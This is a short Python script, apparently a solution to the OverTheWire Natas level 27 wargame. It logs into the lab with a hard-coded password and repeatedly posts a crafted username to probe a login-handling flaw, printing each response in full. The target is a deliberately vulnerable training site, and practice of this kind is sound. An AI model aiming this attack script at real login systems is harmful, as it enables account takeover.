import requests
from requests.auth import HTTPBasicAuth
from requests.sessions import RequestsCookieJar
import string
import random
import base64


# receive a requests.Response object and dissect it
def dissect_response(response):

    print("Encoding: " + response.apparent_encoding)
    print("-----------------------")
    print("Content: " + str(response.content))
    print("-----------------------")
    print("Cookies: " + str(response.cookies))
    print("-----------------------")
    print("Elapsed time: " + str(response.elapsed))
    print("-----------------------")
    print("Encoding: " + str(response.encoding))
    print("-----------------------")
    print("Headers: " + str(response.headers))
    print("-----------------------")
    print("History: " + str(response.history))
    print("-----------------------")
    try:
        print("JSON: " + str(response.json()))
    except:
        pass
    print("-----------------------")
    print("Links: " + str(response.links))
    print("-----------------------")
    print("Next: " + str(response.next))
    print("-----------------------")
    print("OK:" + str(response.ok))
    print("-----------------------")
    print("Raw: " + str(response.raw))
    print("-----------------------")
    print("Reason: " + str(response.reason))
    print("-----------------------")
    print("Status code: " + str(response.status_code))
    print("-----------------------")
    print("Text: " + str(response.text))
    print("-----------------------")
    print("URL: " + str(response.url))



def exploit():
    sess = requests.Session()
    auth_username = "natas27"
    auth_password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
    headers = {'Content-Type':'text/html;charset=utf-7'}
    response = sess.get("http://natas27.natas.labs.overthewire.org/", auth=HTTPBasicAuth(auth_username, auth_password))
    # dissect_response(response)
    
    payload = {
        'username':'natas27%',
        'password':'12345',
        'submit':'login'
    }
    response = sess.post("http://natas27.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth(auth_username, auth_password), data=payload, allow_redirects=False)
    dissect_response(response)

    response = sess.post("http://natas27.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth(auth_username, auth_password), data=payload, allow_redirects=False)
    dissect_response(response)
    
    response = sess.post("http://natas27.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth(auth_username, auth_password), data=payload, allow_redirects=False)
    dissect_response(response)

exploit()